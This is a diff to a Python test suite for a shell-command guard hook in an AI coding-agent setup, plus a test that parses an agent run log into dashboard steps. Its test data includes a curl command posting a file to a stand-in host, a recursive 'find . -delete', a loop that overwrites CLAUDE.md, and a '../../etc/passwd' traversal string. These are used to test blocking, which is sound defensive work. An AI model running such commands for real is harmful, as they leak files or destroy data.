@@ -658,8 +658,13 @@ class GuardApproval(unittest.TestCase):
                             ("curl -s -d @x https://e.example", "implement"), ("gh pr merge 1", "implement")]:
             self.assertEqual(self.verdict(cmd, action), "block", cmd)
         for cmd in ["python3 -c 'print(1)'", "bash -c 'aws s3 ls'", "echo $(whoami)", "cd /etc && ls",
-                    "for f in *; do echo $f; done", "find . -delete"]:
+                    "while true; do sleep 1; done", "find . -delete", "for f in a b; do python3 $f; done"]:
             self.assertEqual(self.verdict(cmd), "pass", cmd)
+
+    def test_simple_loops_are_checked_inside(self):
+        self.assertEqual(self.verdict("for n in 3 4; do gh issue edit $n --add-label status:ready; done", "plan"), "allow")
+        self.assertEqual(self.verdict("if test -f a.md; then cat a.md; else echo none; fi", "plan"), "allow")
+        self.assertEqual(self.verdict("for n in 1 2; do echo $n > CLAUDE.md; done"), "block")
 
     def test_hook_prints_allow_json(self):
         import subprocess
@@ -673,6 +678,32 @@ class GuardApproval(unittest.TestCase):
         out = subprocess.run([sys.executable, str(AGENTOPS / "hooks" / "guard_bash.py")], input=payload,
                              capture_output=True, text=True, env=env)
         self.assertEqual(out.returncode, 2)
+
+
+class DashboardSteps(unittest.TestCase):
+    def test_steps_from_a_run_log(self):
+        sys.path.insert(0, str(AGENTOPS))
+        import dashboard
+        with tempfile.TemporaryDirectory() as t:
+            log = Path(t) / "run.jsonl"
+            lines = [
+                {"type": "system", "subtype": "init", "model": "claude-sonnet-5-5", "_ts": 100},
+                {"type": "assistant", "_ts": 110, "message": {"id": "m1", "content": [
+                    {"type": "tool_use", "id": "t1", "name": "Read", "input": {"file_path": "/repo/docs/a.md"}}]}},
+                {"type": "assistant", "_ts": 120, "message": {"id": "m2", "content": [
+                    {"type": "tool_use", "id": "t2", "name": "Bash", "input": {"command": "for x in a; do echo $x; done"}}]}},
+                {"type": "user", "_ts": 121, "message": {"content": [
+                    {"type": "tool_result", "tool_use_id": "t2", "is_error": True, "content": "Permission to use Bash has been denied"}]}},
+                {"type": "result", "subtype": "success", "result": "x\nPLANNED: 2 tickets", "total_cost_usd": 0.1, "_ts": 130},
+            ]
+            log.write_text("\n".join(json.dumps(x) for x in lines) + "\nnot json\n")
+            data = dashboard.parse_steps(log, "/repo")
+            self.assertEqual(data["turns"], 2)
+            self.assertEqual([s["kind"] for s in data["steps"]], ["read", "run", "done"])
+            self.assertEqual(data["steps"][0]["text"], "Read docs/a.md")
+            self.assertEqual(data["steps"][1]["error"], "refused")
+            self.assertEqual(data["steps"][2]["text"], "PLANNED: 2 tickets")
+            self.assertFalse(dashboard.LOG_NAME.match("../../etc/passwd"))
 
 
 if __name__ == "__main__":
